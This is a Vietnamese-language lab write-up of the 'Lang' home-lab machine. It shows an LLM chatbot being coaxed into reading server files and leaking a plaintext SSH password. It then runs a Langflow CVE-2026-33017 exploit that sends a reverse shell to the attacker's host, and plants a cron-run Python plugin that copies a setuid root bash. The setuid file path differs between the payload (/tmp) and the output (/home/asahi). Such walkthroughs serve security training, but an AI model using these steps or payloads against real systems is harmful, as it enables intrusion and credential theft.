---
title: Writeup Vulnerable Machine
description: A simple example of a Markdown blog post.
pubDate: 2026-07-11
tags: ['Home Lab Machine']
---

# Lang - Vulnerable Machine

---

# Machine Information

| Field        | Value          |
| ------------ | -------------- |
| Machine Name | Lang           |
| OS           | Linux (Debian) |
| Author       | Arasu          |
| Difficulty   | Easy           |
| Date         | 13th May 2026  |

---

# Enumeration

---

## Nmap

---

```bash
nmap -sC -sV -Pn 192.168.0.107
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-28 10:22 EDT
Nmap scan report for 192.168.0.107 (192.168.0.107)
Host is up (0.0036s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://doantn.htb/
MAC Address: 08:00:27:4D:82:3A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.39 seconds
```

Ta thấy có 2 port đang mở là port 22 `SSH` và port 80 là một website với domain `doantn.htb`

![alt text](./Image/Pasted%20image%2020260528213053.png)

Tổng quan thì đây là một trang web chatbot cơ bản đang được xây dựng, có chức năng hỏi đáp đơn giản

![alt text](./Image/Pasted%20image%2020260528224056.png)

![alt text](./Image/Pasted%20image%2020260528224138.png)

# Foothold

---

## User dev-doan

Chat bot này có thể đọc file nội bộ của server. Ta thấy có 2 user bình thường là `asahi:1000` và `dev-doan:1001`.

![alt text](./Image/Pasted%20image%2020260528224832.png)

Thử đọc trong thư mục home của 2 user này xem có thông tin gì

![alt text](./Image/Pasted%20image%2020260528224719.png)

Trong file `.bash_history` của user `asahi` có một lệnh tạo file tại `/var/tmp/secret.txt`. Việc đọc được file trong thư mục home của user `asahi` chứng minh khả năng chatbot phía sau chạy với quyền user `asahi`.

Thử đọc file `/var/tmp/secret.txt`

![alt text](./Image/Pasted%20image%2020260528225336.png)

Có vẻ có một file credential nào đó được lưu trong thư mục home của user. Thử đọc file `credential.txt` trong `home/asahi`

![alt text](./Image/Pasted%20image%2020260528225904.png)

Có vẻ là không có nội dung gì hoặc file này không tồn tại. Thử đọc file `credential.txt` trong user`home/dev-doan`

![alt text](./Image/Pasted%20image%2020260528230126.png)

Chatbot đã trả lời có file `credential.txt` trong `home/dev-doan` còn trong `home/asahi` thì không có file nào như vậy.
Nội dung file `home/dev-doan/credential.txt` là `dev-doan:45rdf6gh7`. Đây có thể là mật khẩu đăng nhập SSH của user `dev-doan`.

Đăng nhập thành công user `dev-doan` qua `SSH`

```shell
ssh dev-doan@192.168.0.107
dev-doan@192.168.0.107's password:
Linux doantn 6.12.88+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.88-1 (2026-05-15) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat May  9 23:52:19 2026 from 192.168.0.113
dev-doan@doantn:~$ id
uid=1001(dev-doan) gid=1001(dev-doan) groups=1001(dev-doan),100(users)
dev-doan@doantn:~$
```

## User asahi

Kiểm tra các dịch vụ chạy trên server

```bash
dev-doan@doantn:~$ ss -tuln
Netid           State      Local Address:Port
tcp             LISTEN     127.0.0.1:7860
tcp             LISTEN     127.0.0.1:7749
tcp             LISTEN     0.0.0.0:80
tcp             LISTEN     0.0.0.0:22
tcp             LISTEN     [::]:80
tcp             LISTEN     [::]:22
```

Ta thấy có hai cổng đang chạy trên localhost là `7860` và `7749`, khả năng đây là những dịch vụ backend cho website chatbot vừa rồi.
Với thông tin đăng nhập `SSH`, ta có thể sử dụng `SSH` để truy cập vào những dịch vụ này bằng kỹ thuật Port Fowarding bằng lệnh sau

```bash
 ssh dev-doan@192.168.0.107 -D 7860 -N
dev-doan@192.168.0.107's password:


```

Lệnh này sẽ mở một cổng 7860 trên máy tấn công, những request sẽ thông qua port 7860 đến `SSH` và tới với các dịch vụ nội bộ.

Cấu hình trên công cụ Burp Suite để truy cập

![alt text](./Image/Pasted%20image%2020260528232542.png)

Truy cập vào hai dịch vụ `7860` và `7749`

![alt text](./Image/Pasted%20image%2020260528233115.png)

Port `7749` host một server LLM Local, sử dụng Model Qwen3.5

![alt text](./Image/Pasted%20image%2020260528232726.png)
Port `7860` đang chạy một trang web `Langflow`, đây là một công cụ giúp xây dựng và triển khai flow cho AI.

![alt text](./Image/Pasted%20image%2020260528233254.png)

`Langflow` đang sử dụng là phiên bản 1.8.1

![alt text](./Image/Pasted%20image%2020260528233458.png)

Kiểm tra repo của `Langflow` có một mã `CVE-2026-33017` cho phép thực thi lệnh hệ thống mà không cần xác thực.
Dựa trên lỗ hổng đọc file của chatbot trước đó, backend phía sau có thể chạy với quyền user `asahi`. Vậy có thể `Langflow` đang chạy dưới user `asahi` và ta có thể chiếm được shell user asahi với `CVE-2026-33017`

Tạo một script tự động exploit bằng python

```bash
proxychains python3 CVE-2026-33017.py http://127.0.0.1:7860 --lhost 192.168.0.113 --lport 4953
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[+] Target: http://127.0.0.1:7860
[*] Fetching auth token...
[proxychains] Strict chain  ...  127.0.0.1:7860  ...  127.0.0.1:7860  ...  OK
[+] Acquired auth token.
[*] Creating public flow...
[+] Created public flow: 97eff57c-7201-4ab8-849f-7043d5c980ed
[*] Sending payload...
[+] Payload sent. Request timed out as expected (check your listener).
```

Reverse shell được user `asahi`

```bash
nc -lvnp 4953
listening on [any] 4953 ...
connect to [192.168.0.113] from (UNKNOWN) [192.168.0.107] 58608
id
uid=1000(asahi) gid=1000(asahi) groups=1000(asahi),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(bluetooth)
python3 -c 'import pty;pty.spawn("/bin/bash")'
asahi@doantn:~$ id
id
uid=1000(asahi) gid=1000(asahi) groups=1000(asahi),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(bluetooth)
asahi@doantn:~$
```

```bash
asahi@doantn:~$ ls -la
total 44
drwx------ 6 asahi asahi 4096 May 21 11:00 .
drwxr-xr-x 4 root  root  4096 Apr 10 07:31 ..
-rw------- 1 asahi asahi   26 May 21 11:00 .bash_history
-rw-r--r-- 1 asahi asahi  220 Apr  3 14:37 .bash_logout
-rw-r--r-- 1 asahi asahi 3552 Apr  7 13:16 .bashrc
drwxr-x--- 4 asahi asahi 4096 Apr  6 04:16 .cache
drwxr-x--- 4 asahi asahi 4096 Apr  6 02:20 .config
drwxr-x--- 7 asahi asahi 4096 Apr  6 04:02 langflow-env
drwxr-x--- 4 asahi asahi 4096 Apr  6 03:03 .local
-rw-r--r-- 1 asahi asahi  812 Apr  7 13:50 .profile
-rw-r----- 1 root  asahi   33 Apr 24 14:03 user.txt
asahi@doantn:~$ id
uid=1000(asahi) gid=1000(asahi) groups=1000(asahi),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(bluetooth)
asahi@doantn:~$
```

# Privilege Escalation

---

Kiểm tra các thư mục user asahi có quyền writable

```bash
asahi@doantn:~$ find / -path "$HOME" -prune -o -type d -writable -print 2>/dev/null
/run/lock
/dev/mqueue
/dev/shm
/proc/1108/task/1108/fd
/proc/1108/fd
/proc/1108/map_files
/tmp
/tmp/.font-unix
/tmp/.XIM-unix
/tmp/.ICE-unix
/tmp/.X11-unix
/var/tmp
/opt/langflow-backup/plugins
```

Có một thư mục `/opt/langflow-backup/plugins` lạ

```bash
asahi@doantn:/opt/langflow-backup$ ls -la
total 28
drwxr-xr-x 5 root root  4096 May 28 07:36 .
drwxr-xr-x 4 root root  4096 May 21 14:38 ..
-rw-r--r-- 1 root root   595 May 14 13:56 backup.py
-rw-r--r-- 1 root root   201 May 14 13:54 config.py
drwxr-xr-x 3 root root  4096 May 28 07:40 core
drwxrwxr-x 2 root asahi 4096 May 14 13:54 plugins
drwxr-xr-x 2 root root  4096 May 14 15:30 __pycache__
```

```bash
asahi@doantn:/opt/langflow-backup$ ls -la core
total 16
drwxr-xr-x 3 root root 4096 May 28 07:40 .
drwxr-xr-x 5 root root 4096 May 28 07:36 ..
-rw-r--r-- 1 root root  338 May 14 13:55 db_backup.py
-rw-r--r-- 1 root root    0 May 14 13:55 __init__.py
drwxr-xr-x 2 root root 4096 May 14 15:30 __pycache__

```

Đây có vẻ là chương trình backup database cho `Langflow`, và thư mục `plugins` user `asahi` có quyền ghi.

```bash
asahi@doantn:/etc/cron.d$ cat langflow-backup
0 */2 * * * root /usr/bin/python3 /opt/langflow-backup/backup.py >/dev/null 2>&1
```

Kiểm tra cronjob thì chương trình backup được với quyền root, mỗi 2 tiếng sẽ backup 1 lần.

Phân tích nội dung các file chương trình

`backup.py`

```python
#!/usr/bin/python3

import importlib
import sys
import config
from core import db_backup

class DefaultLogger:
    def info(self, msg):
        with open("/var/log/langflow-backup.log", "a") as f:
            f.write(msg + "\n")

def load_logger():
    sys.path.insert(0, config.PLUGIN_DIR)

    try:
        plugin = importlib.import_module(config.LOGGER_PLUGIN)
        return plugin.Logger()
    except Exception:
        return DefaultLogger()

def main():
    logger = load_logger()
    db_backup.run_backup(config.DB_PATH, config.BACKUP_DIR, logger)

if __name__ == "__main__":
    main()

```

`config.py`

```python
DB_PATH = "/home/asahi/langflow-env/lib/python3.13/site-packages/langflow/langflow.db"
BACKUP_DIR = "/var/backups/langflow"

PLUGIN_DIR = "/opt/langflow-backup/plugins"
LOGGER_PLUGIN = "backup_logger"
```

`core/db_backup.py`

```python
import os
import shutil
import time

def run_backup(db_path, backup_dir, logger):
    os.makedirs(backup_dir, exist_ok=True)

    ts = time.strftime("%Y%m%d_%H%M%S")
    dst = f"{backup_dir}/langflow_{ts}.db"

    logger.info(f"Starting database backup: {dst}")
    shutil.copy2(db_path, dst)
    logger.info("Database backup completed")
```

Tổng quan, chương trình này sẽ backup database của `Langflow` tại `/var/backups/langflow` và ghi log lại trong `/var/log/langflow-backup.log`.

Tại hàm `load_logger`

```python
plugin = importlib.import_module(config.LOGGER_PLUGIN)
return plugin.Logger()
```

Đoạn code này sẽ import module `LOGGER_PLUGIN="backup_logger"` trong thư mục `/opt/langflow-backup/plugins`, kết quả return một class `Logger()` trong module đó.

Ngoài ra, module `logger` còn được truyền tới hàm `run_backup` trong file `db_backup.py`.
`Logger` sẽ gọi một hàm `info()`.

Vậy ta cần tạo một module python trong `/opt/langflow-backup/plugins` với tên file là `backup_logger` và phải có một class tên `Logger`. Trong class `Logger` cần có hàm `info()` để chương trình có thể chạy được.

Mã khai thác mẫu như sau

```python
import os

class Logger:
    def __init__(self):
        os.system("cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash")

    def info(self, msg):
        pass
```

Ghi đoạn script trên vào file `/opt/langflow-backup/plugins/backup_logger.py` và đợi cronjob root chạy

```bash
asahi@doantn:/etc/cron.d$ sleep 3m; ls -la /home/asahi/rootbash
-rwsr-xr-x 1 root root 1298416 May 28 13:39 /home/asahi/rootbash
asahi@doantn:/etc/cron.d$ /home/asahi/rootbash -p
rootbash-5.2# id
uid=1000(asahi) gid=1000(asahi) euid=0(root) groups=1000(asahi)
```

```bash
rootbash-5.2# ls -la
total 32
drwx------  4 root root 4096 May 28 11:25 .
drwxr-xr-x 18 root root 4096 May 21 12:14 ..
lrwxrwxrwx  1 root root    9 May 18 13:39 .bash_history -> /dev/null
-rw-r--r--  1 root root  607 Mar  2 16:50 .bashrc
-rw-------  1 root root   20 May 28 11:25 .lesshst
drwxr-xr-x  3 root root 4096 Apr  6 06:33 .local
-rw-r--r--  1 root root  132 Mar  2 16:50 .profile
-rw-r-----  1 root root   33 Apr 24 14:01 root.txt
drwx------  2 root root 4096 Apr  6 02:18 .ssh
rootbash-5.2# cat root.txt
58f4e8dd09c97fee9b1bfcc752dec520
```

Chiếm quyền root thành công

# Video

<iframe width="100%" height="468" src="https://www.youtube.com/embed/WmuGddo_nEc?rel=0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" allowfullscreen loading="lazy" referrerpolicy="strict-origin-when-cross-origin"></iframe>
